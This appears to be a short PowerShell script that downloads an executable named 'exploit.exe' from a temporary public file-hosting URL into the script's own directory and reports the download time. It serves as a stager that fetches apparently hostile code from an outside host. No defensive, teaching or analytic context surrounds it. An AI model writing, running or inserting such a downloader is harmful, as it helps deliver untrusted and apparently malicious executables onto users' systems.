$url = "https://tmpfiles.org/dl/22667/exploit.exe"
$output = "$PSScriptRoot\exploit.exe"
$start_time = Get-Date

Invoke-WebRequest -Uri $url -OutFile $output
Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"